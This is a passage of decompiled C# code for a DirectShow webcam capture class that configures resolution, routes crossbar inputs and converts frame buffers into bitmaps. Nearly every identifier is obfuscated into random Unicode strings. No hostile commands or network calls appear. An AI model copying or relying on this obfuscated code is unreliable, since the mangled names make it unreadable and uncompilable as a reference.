          this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, 㶽ɞ쾗舺\uF5C77詖\uE932ؤỘ䏳귁킁얤ᴘ塑艺ㅎ拞愛.쌈\u23A5鲺炵㒣ꇃ䀉\u3254芤\u1CAF흨硺䭨ồࠃ\u2327篜剴깕\uABFF, this.snapshotResolution, ref this.snapshotCapabilities);
        else
          this.snapshotCapabilities = new 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[0];
        lock (VideoCaptureDevice.cacheVideoCapabilities)
        {
          if (this.videoCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheVideoCapabilities.Add(this.deviceMoniker, this.videoCapabilities);
          }
        }
        lock (VideoCaptureDevice.cacheSnapshotCapabilities)
        {
          if (this.snapshotCapabilities != null)
          {
            if (!VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
              VideoCaptureDevice.cacheSnapshotCapabilities.Add(this.deviceMoniker, this.snapshotCapabilities);
          }
        }
        if (runGraph)
        {
          graphBuilder1.RenderStream(㶽ɞ쾗舺\uF5C77詖\uE932ؤỘ䏳귁킁얤ᴘ塑艺ㅎ拞愛.䦝놌͒璼췣ŋ瀰춟圅扲\uED0B肓\uF751洓餙肫뮽烏\uFFFD畯, 懦쫐梗셑\uEAD1ꢉ疓쇜\u2A2E翊ᶧ쨭隉ꦒ\u266Aｾᕠ䊦諀쿲.뮤\u2BDE䤡鸵ꩍ\uFFFD槪韪\uF495瑇㙑\u2660村혃ѽ\uFFFD掦䧠敫쑽, (object) 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null, 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅5);
          if (䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3.GetConnectedMediaType(mediaType) == 0)
          {
            悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼 structure = (悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼));
            callback1.Width = structure.\u2750㷋ꏫ醽途夃巁톓횾슧惽\uFFFD\u0FBE揪ӫ䘳\u21C0\u2581胝᯳.\uE0E0궗\u2FB5\u21D9箕痨锂\uFFFD\u2EB8瑄앯ꐈ誹ℼ쳈裃萏뽑냜㽳;
            callback1.Height = structure.\u2750㷋ꏫ醽途夃巁톓횾슧惽\uFFFD\u0FBE揪ӫ䘳\u21C0\u2581胝᯳.헫쎳ොிﯼ렛놮팔ɷ꿧뇶냿초瓶\u0379\uFE18ﲑ\uFFFD\uF6D5\uFFFD;
            mediaType.Dispose();
          }
          if (flag && this.provideSnapshots)
          {
            graphBuilder1.RenderStream(㶽ɞ쾗舺\uF5C77詖\uE932ؤỘ䏳귁킁얤ᴘ塑艺ㅎ拞愛.쌈\u23A5鲺炵㒣ꇃ䀉\u3254芤\u1CAF흨硺䭨ồࠃ\u2327篜剴깕\uABFF, 懦쫐梗셑\uEAD1ꢉ疓쇜\u2A2E翊ᶧ쨭隉ꦒ\u266Aｾᕠ䊦諀쿲.뮤\u2BDE䤡鸵ꩍ\uFFFD槪韪\uF495瑇㙑\u2660村혃ѽ\uFFFD掦䧠敫쑽, (object) 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null, 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅6);
            if (䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4.GetConnectedMediaType(mediaType) == 0)
            {
              悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼 structure = (悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼) Marshal.PtrToStructure(mediaType.FormatPtr, typeof (悸杻괸ꋛ陭Ḷ釢錌絝\uFFFDꉐ眣嶡杵饃\u28DE\uF62D鐂鹍翼));
              callback2.Width = structure.\u2750㷋ꏫ醽途夃巁톓횾슧惽\uFFFD\u0FBE揪ӫ䘳\u21C0\u2581胝᯳.\uE0E0궗\u2FB5\u21D9箕痨锂\uFFFD\u2EB8瑄앯ꐈ誹ℼ쳈裃萏뽑냜㽳;
              callback2.Height = structure.\u2750㷋ꏫ醽途夃巁톓횾슧惽\uFFFD\u0FBE揪ӫ䘳\u21C0\u2581胝᯳.헫쎳ොிﯼ렛놮팔ɷ꿧뇶냿초瓶\u0379\uFE18ﲑ\uFFFD\uF6D5\uFFFD;
              mediaType.Dispose();
            }
          }
          浪\uEE87堪ܸ뙭ಃ鳸㷸節\u32B3湏\uECBD\uF33D\uE2EA\u24FF\uA7BF\u0F48䘷屜絤 浪堪ܸ뙭ಃ鳸㷸節湏䘷屜絤2 = (浪\uEE87堪ܸ뙭ಃ鳸㷸節\u32B3湏\uECBD\uF33D\uE2EA\u24FF\uA7BF\u0F48䘷屜絤) o2;
          \u2066ਲ癝윗췇ک\u087C\u26CB音涷歍쉔눶姉駀곍럚퍅\uE76Aວ obj2 = (\u2066ਲ癝윗췇ک\u087C\u26CB音涷歍쉔눶姉駀곍럚퍅\uE76Aວ) o2;
          浪堪ܸ뙭ಃ鳸㷸節湏䘷屜絤2.Run();
          if (flag && this.provideSnapshots)
          {
            this.startTime = DateTime.Now;
            撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ.SetMode(pin, \uFFFD\uEEFE뼟ក\u0AF5Ϥ\uFFFD\u2A67螨秠沢\uE24B崨萿\uE637깾䈟Ǝ\uFFFD\u29BC.\uA4FF蟾襙쮛ꁊ䰴넲錼㛟\uFFFD䐿倣탈퇂\uEAF8펋밎ⵃ셯\u2376);
          }
          do
          {
            䒢껏ᒭퟌ\uFF09燣ᏽ仰辻㣰蔫詿脖쵓\u07B9ᤣ氖ᗀ᱓䡋 lEventCode;
            IntPtr lParam1;
            IntPtr lParam2;
            if (obj2 != null && obj2.GetEvent(out lEventCode, out lParam1, out lParam2, 0) >= 0)
            {
              obj2.FreeEventParams(lEventCode, lParam1, lParam2);
              if (lEventCode == 䒢껏ᒭퟌ\uFF09燣ᏽ仰辻㣰蔫詿脖쵓\u07B9ᤣ氖ᗀ᱓䡋.\uEF82찣襓\u24F7낾縣椁울ᩱ樶\uFFFDሖ㽌\uFFFD쉓냍ᨂꕗ䤷\u0F1A)
              {
                reason = 퓈\u0D49襒\u24A9ୈ쐷姄䅬\uFFFD\u2874유\u1C8Fשּׂ聟靉\uEA44앚\u254D麘뺔.웊ꏻ柠ꗡ䮚衞\uEE41恮刳뉪\uFFFD蘔\u1AE8ᅴ\uF8FE㮪ዑ\uFFFD\uA8CB쐴;
                break;
              }
            }
            if (this.needToSetVideoInput)
            {
              this.needToSetVideoInput = false;
              if (this.isCrossbarAvailable.Value)
              {
                this.SetCurrentCrossbarInput(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫, this.crossbarVideoInput);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫);
              }
            }
            if (this.needToSimulateTrigger)
            {
              this.needToSimulateTrigger = false;
              if (flag && this.provideSnapshots)
                撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ.SetMode(pin, \uFFFD\uEEFE뼟ក\u0AF5Ϥ\uFFFD\u2A67螨秠沢\uE24B崨萿\uE637깾䈟Ǝ\uFFFD\u29BC.䋙蹅蕖쉗易縉\uE7C3赤\uF81C갾棛魖\uF0E0\u3205盬\uE977\uF7D9颔ὢ㘢);
            }
            if (this.needToDisplayPropertyPage)
            {
              this.needToDisplayPropertyPage = false;
              this.DisplayPropertyPage(this.parentWindowForPropertyPage, this.sourceObject);
              if (楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫 != null)
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫);
            }
            if (this.needToDisplayCrossBarPropertyPage)
            {
              this.needToDisplayCrossBarPropertyPage = false;
              if (楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫 != null)
              {
                this.DisplayPropertyPage(this.parentWindowForPropertyPage, (object) 楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫);
                this.crossbarVideoInput = this.GetCurrentCrossbarInput(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫);
              }
            }
          }
          while (!this.stopEvent.WaitOne(100, false));
          浪堪ܸ뙭ಃ鳸㷸節湏䘷屜絤2.Stop();
        }
      }
      catch (Exception ex)
      {
        if (this.VideoSourceError != null)
          this.VideoSourceError((object) this, new 土蘜뷕뜢ᨠ\uF5A8風\u2724ꊵổ䎏얕㨶丁宸\u2D79\u2544罊값螁(ex.Message));
      }
      finally
      {
        깊ﾶ婔ಛ쯕쑚㮣뤙鏝䲷䋋㦠 = (깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF) null;
        쨽ﮙ鰡謹㩐풿氋ﴋᚬ䰚ﻳܙ惷얙芺믧 = (\u1364쨽ﮙ\uEB1F鰡謹㩐\uF084풿氋ﴋᚬ䰚ﻳܙ惷얙\u0B65芺믧) null;
        灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅1 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
        浪堪ܸ뙭ಃ鳸㷸節湏䘷屜絤1 = (浪\uEE87堪ܸ뙭ಃ鳸㷸節\u32B3湏\uECBD\uF33D\uE2EA\u24FF\uA7BF\u0F48䘷屜絤) null;
        obj1 = (\u2066ਲ癝윗췇ک\u087C\u26CB音涷歍쉔눶姉駀곍럚퍅\uE76Aວ) null;
        灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅2 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
        灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅3 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵1 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) null;
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵2 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) null;
        if (o2 != null)
          Marshal.ReleaseComObject(o2);
        if (this.sourceObject != null)
        {
          Marshal.ReleaseComObject(this.sourceObject);
          this.sourceObject = (object) null;
        }
        if (o3 != null)
          Marshal.ReleaseComObject(o3);
        if (o4 != null)
          Marshal.ReleaseComObject(o4);
        if (o1 != null)
          Marshal.ReleaseComObject(o1);
        if (retInterface != null)
          Marshal.ReleaseComObject(retInterface);
      }
      if (this.PlayingFinished == null)
        return;
      this.PlayingFinished((object) this, reason);
    }

    private void SetResolution(
      \uF5E5\uFFFD\uE942\u2F37鵧\uF4A7즰ᰈ\u289E拚\u28CC唕ꂹ瓃샼\uE950갽墁熖홧 streamConfig,
      避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ resolution)
    {
      if (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ.㤘\uF89D\uFFFDᐞ摦埀蓨냙\uFFFD㟈䚮颪츤\uEEB9\uF555䦑孯轞妙쬥(resolution, (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ) null))
        return;
      int count = 0;
      int size = 0;
      AMMediaType mediaType = (AMMediaType) null;
      筶\u2668\u24BE䓵쟎弁돝όூ〦ₑደ羃盶젭\u0A62욋ຄ붩\uEA4F streamConfigCaps = new 筶\u2668\u24BE䓵쟎弁돝όூ〦ₑደ羃盶젭\u0A62욋ຄ붩\uEA4F();
      streamConfig.GetNumberOfCapabilities(out count, out size);
      for (int index = 0; index < count; ++index)
      {
        try
        {
          避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ b = new 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ(streamConfig, index);
          if (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ.㤘\uF89D\uFFFDᐞ摦埀蓨냙\uFFFD㟈䚮颪츤\uEEB9\uF555䦑孯轞妙쬥(resolution, b))
          {
            if (streamConfig.GetStreamCaps(index, out mediaType, streamConfigCaps) == 0)
              break;
          }
        }
        catch
        {
        }
      }
      if (mediaType == null)
        return;
      streamConfig.SetFormat(mediaType);
      mediaType.Dispose();
    }

    private void GetPinCapabilitiesAndConfigureSizeAndRate(
      깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF graphBuilder,
      퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 baseFilter,
      Guid pinCategory,
      避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ resolutionToSet,
      ref 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[] capabilities)
    {
      object retInterface;
      graphBuilder.FindInterface(pinCategory, 懦쫐梗셑\uEAD1ꢉ疓쇜\u2A2E翊ᶧ쨭隉ꦒ\u266Aｾᕠ䊦諀쿲.뮤\u2BDE䤡鸵ꩍ\uFFFD槪韪\uF495瑇㙑\u2660村혃ѽ\uFFFD掦䧠敫쑽, baseFilter, typeof (\uF5E5\uFFFD\uE942\u2F37鵧\uF4A7즰ᰈ\u289E拚\u28CC唕ꂹ瓃샼\uE950갽墁熖홧).GUID, out retInterface);
      if (retInterface != null)
      {
        \uF5E5\uFFFD\uE942\u2F37鵧\uF4A7즰ᰈ\u289E拚\u28CC唕ꂹ瓃샼\uE950갽墁熖홧 鵧즰ᰈ拚唕ꂹ瓃샼갽墁熖홧 = (\uF5E5\uFFFD\uE942\u2F37鵧\uF4A7즰ᰈ\u289E拚\u28CC唕ꂹ瓃샼\uE950갽墁熖홧) null;
        try
        {
          鵧즰ᰈ拚唕ꂹ瓃샼갽墁熖홧 = (\uF5E5\uFFFD\uE942\u2F37鵧\uF4A7즰ᰈ\u289E拚\u28CC唕ꂹ瓃샼\uE950갽墁熖홧) retInterface;
        }
        catch (InvalidCastException ex)
        {
        }
        if (鵧즰ᰈ拚唕ꂹ瓃샼갽墁熖홧 != null)
        {
          if (capabilities == null)
          {
            try
            {
              capabilities = 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ.坤쮂툢苙깏죖䨎見ኢ舦ҫ췟쏦众\u31E1쵄覩芅ꂪ軿(鵧즰ᰈ拚唕ꂹ瓃샼갽墁熖홧);
            }
            catch
            {
            }
          }
          if (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ.\uFFFD怭\u2E19选\u2E52\uF6CE霋ờԣ뿀嘩Ѫ䳉죒ﵿ퐈͛瘔의鮲(resolutionToSet, (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ) null))
            this.SetResolution(鵧즰ᰈ拚唕ꂹ瓃샼갽墁熖홧, resolutionToSet);
        }
      }
      if (capabilities != null)
        return;
      capabilities = new 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[0];
    }

    private void DisplayPropertyPage(IntPtr parentWindow, object sourceObject)
    {
      try
      {
        후뎮굩瑔珲利\uF894㱝曪龅游븦扄캉聍䋌\uF56A삖\uFFFD\uE2D2 pPages;
        ((욘ꓖ鑳ᓠꪶ皬娓㠹\u2401搣㗯졈\u2ED8瘴\uE1F7뚴ꤵ縩㝸ℱ) sourceObject).GetPages(out pPages);
        FilterInfo filterInfo = new FilterInfo(this.deviceMoniker);
        瓛茳畴伕\uF4CC\u23A9驆拤像믡堅ኇ\u2151ꙋ\u2FE9魆\uEC5Fɜ位暟.滸\u22D3\uE7CA驖悪\uFFFD\u2BD5Ϫ蛾\u18AC\uFFFD䅻啮悹袄\uEE42थ\u0E64\u3262쯵(parentWindow, 0, 0, filterInfo.Name, 1, ref sourceObject, pPages.ꚻ\uE0E8ꕆࠇ\u2937젌ᄡ蚏ﾐ\u224E턿챳\uF16A\uF306뺷忌폗넒䑏㨠, pPages.碟\uEC46븯\uF592\uFFFDᏸஷ共錋\uE741ӣ㞰\u1ADE\u1C9C펄ゑⳄ\uF20B禔櫗, 0, 0, IntPtr.Zero);
        Marshal.FreeCoTaskMem(pPages.碟\uEC46븯\uF592\uFFFDᏸஷ共錋\uE741ӣ㞰\u1ADE\u1C9C펄ゑⳄ\uF20B禔櫗);
      }
      catch
      {
      }
    }

    private 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[] ColletCrossbarVideoInputs(
      楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫 crossbar)
    {
      lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
      {
        if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
          return VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
        List<㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀> 㮽윛橵됒谋䰨뎿篪끮챌扵勵겄䋂鬥㾛ꉄ嫾텀List = new List<㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀>();
        int inputPinCount;
        if (crossbar != null && crossbar.get_PinCounts(out int _, out inputPinCount) == 0)
        {
          for (int index = 0; index < inputPinCount; ++index)
          {
            캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝 physicalType;
            if (crossbar.get_CrossbarPinInfo(true, index, out int _, out physicalType) == 0 && physicalType < 캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝.\uE5CC볡\uEAFD\u23E2\uF853贎覱䩿챮ᓆ\u0BDCꞟꅖ笽潄鮹\uEF92䙀陖ԭ)
              㮽윛橵됒谋䰨뎿篪끮챌扵勵겄䋂鬥㾛ꉄ嫾텀List.Add(new 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀(index, physicalType));
          }
        }
        㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[] array = new 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[㮽윛橵됒谋䰨뎿篪끮챌扵勵겄䋂鬥㾛ꉄ嫾텀List.Count];
        㮽윛橵됒谋䰨뎿篪끮챌扵勵겄䋂鬥㾛ꉄ嫾텀List.CopyTo(array);
        VideoCaptureDevice.cacheCrossbarVideoInputs.Add(this.deviceMoniker, array);
        return array;
      }
    }

    private 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀 GetCurrentCrossbarInput(
      楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫 crossbar)
    {
      㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀 currentCrossbarInput = 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀.Default;
      int outputPinCount;
      if (crossbar.get_PinCounts(out outputPinCount, out int _) == 0)
      {
        int outputPinIndex = -1;
        int pinIndexRelated;
        for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
        {
          캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝 physicalType;
          if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝.럭쁤맳\u2FF7ꅹ깯뾮넢槛ꈡ瑇针\u2F03ƭ꺛ꠟ\uFFFDખ郵섙)
          {
            outputPinIndex = pinIndex;
            break;
          }
        }
        int inputPinIndex;
        if (outputPinIndex != -1 && crossbar.get_IsRoutedTo(outputPinIndex, out inputPinIndex) == 0)
        {
          캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝 physicalType;
          crossbar.get_CrossbarPinInfo(true, inputPinIndex, out pinIndexRelated, out physicalType);
          currentCrossbarInput = new 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀(inputPinIndex, physicalType);
        }
      }
      return currentCrossbarInput;
    }

    private void SetCurrentCrossbarInput(
      楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫 crossbar,
      㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀 videoInput)
    {
      int outputPinCount;
      int inputPinCount;
      if (videoInput.慘苣ᑙ햨伂\u2F04\u336B鵛飗ﺳ败벻㞀ꌑ洂\u2F7B㺉Ἂ\uF50B썫 == 캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝.Ṁ骄嫈蕀ꮒ仯愎ꦲ槻땣ꛬ\uE636늣\u251F\u125F씴뷴뮎蜺邢 || crossbar.get_PinCounts(out outputPinCount, out inputPinCount) != 0)
        return;
      int outputPinIndex = -1;
      int inputPinIndex = -1;
      int pinIndexRelated;
      캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝 physicalType;
      for (int pinIndex = 0; pinIndex < outputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(false, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == 캆\uE1A7ζ즛鑠켞另魃즶俰쵐\uFFFD㳇濒栍ꌱ\uFFFD䚍왈圝.럭쁤맳\u2FF7ꅹ깯뾮넢槛ꈡ瑇针\u2F03ƭ꺛ꠟ\uFFFDખ郵섙)
        {
          outputPinIndex = pinIndex;
          break;
        }
      }
      for (int pinIndex = 0; pinIndex < inputPinCount; ++pinIndex)
      {
        if (crossbar.get_CrossbarPinInfo(true, pinIndex, out pinIndexRelated, out physicalType) == 0 && physicalType == videoInput.慘苣ᑙ햨伂\u2F04\u336B鵛飗ﺳ败벻㞀ꌑ洂\u2F7B㺉Ἂ\uF50B썫 && pinIndex == videoInput.傷ꑸ\u26E2\u2F3Fᛮ삘ꥍ唈峛\u2280ﬀ悹㽗箔웟瞎㛙짒\uFFFDૐ)
        {
          inputPinIndex = pinIndex;
          break;
        }
      }
      if (inputPinIndex == -1 || outputPinIndex == -1 || crossbar.CanRoute(outputPinIndex, inputPinIndex) != 0)
        return;
      crossbar.Route(outputPinIndex, inputPinIndex);
    }

    private void OnNewFrame(Bitmap image)
    {
      ++this.framesReceived;
      this.bytesReceived += (long) (image.Width * image.Height * (Image.GetPixelFormatSize(image.PixelFormat) >> 3));
      if (this.stopEvent.WaitOne(0, false) || this.NewFrame == null)
        return;
      this.NewFrame((object) this, new 鷛荎쥞ం켈䭍\uE042ྵ퐱э᳜멢鹞ন鞂䊖\u2762ꗙ쉷ె(image));
    }

    private void OnSnapshotFrame(Bitmap image)
    {
      if ((DateTime.Now - this.startTime).TotalSeconds < 4.0 || this.stopEvent.WaitOne(0, false) || this.SnapshotFrame == null)
        return;
      this.SnapshotFrame((object) this, new 鷛荎쥞ం켈䭍\uE042ྵ퐱э᳜멢鹞ন鞂䊖\u2762ꗙ쉷ె(image));
    }

    private class Grabber : ၵ执\uF855릆增텰竻䪶\u28E8逇\uEF6A쳅湫ᎀ䭁횪넌滮퍍\u218A
    {
      private VideoCaptureDevice parent;
      private bool snapshotMode;
      private int width;
      private int height;

      public int Width
      {
        get => this.width;
        set => this.width = value;
      }

      public int Height
      {
        get => this.height;
        set => this.height = value;
      }

      public Grabber(VideoCaptureDevice parent, bool snapshotMode)
      {
        this.parent = parent;
        this.snapshotMode = snapshotMode;
      }

      public int SampleCB(double sampleTime, IntPtr sample) => 0;

      public unsafe int BufferCB(double sampleTime, IntPtr buffer, int bufferLen)
      {
        if (this.parent.NewFrame != null)
        {
          Bitmap image = new Bitmap(this.width, this.height, PixelFormat.Format24bppRgb);
          BitmapData bitmapdata = image.LockBits(new Rectangle(0, 0, this.width, this.height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
          int stride1 = bitmapdata.Stride;
          int stride2 = bitmapdata.Stride;
          byte* dst = (byte*) ((IntPtr) bitmapdata.Scan0.ToPointer() + stride2 * (this.height - 1));
          byte* pointer = (byte*) buffer.ToPointer();
          for (int index = 0; index < this.height; ++index)
          {
            瓛茳畴伕\uF4CC\u23A9驆拤像믡堅ኇ\u2151ꙋ\u2FE9魆\uEC5Fɜ位暟.㷞\uE2EA枥\u1AEA㺧韞䡭媈\u270D勧䭞㩒茢\uEB89졐뚂棢앹㰶벛(dst, pointer, stride1);
            dst -= stride2;
            pointer += stride1;
          }
          image.UnlockBits(bitmapdata);
          if (this.snapshotMode)
            this.parent.OnSnapshotFrame(image);
          else
            this.parent.OnNewFrame(image);
          image.Dispose();
        }
        return 0;
      }
    }
  }
}
